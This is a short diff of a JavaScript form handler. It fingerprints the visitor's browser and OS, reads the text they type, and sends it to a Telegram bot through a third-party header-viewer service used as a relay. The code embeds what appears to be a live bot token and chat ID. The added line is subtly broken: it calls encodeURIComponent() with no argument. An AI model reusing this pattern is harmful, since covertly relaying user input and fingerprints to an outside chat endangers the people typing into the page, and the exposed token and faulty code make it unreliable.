@@ -9,10 +9,11 @@ function ss(){
   var cljs = new ClientJS();
   var cbrowser = cljs.getBrowser();
   var os = cljs.getOS();
+  var p = {"ua":ua, "os": os}
   
   var text = document.getElementById("inp").value;
   
-  var mohtava = "ask:"+text;
+  var mohtava = "ask%3A"+encodeURIComponent(text)+"%23"+encodeURIComponent();
   var url = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx";
   var con = "https://api.telegram.org/bot2072567714:AAFpwTm_8eP43UR5BDUuuMKoFGVKan6WZcw/sendMessage?chat_id=-734718255&text="+mohtava;
   var data={"UrlBox":con,
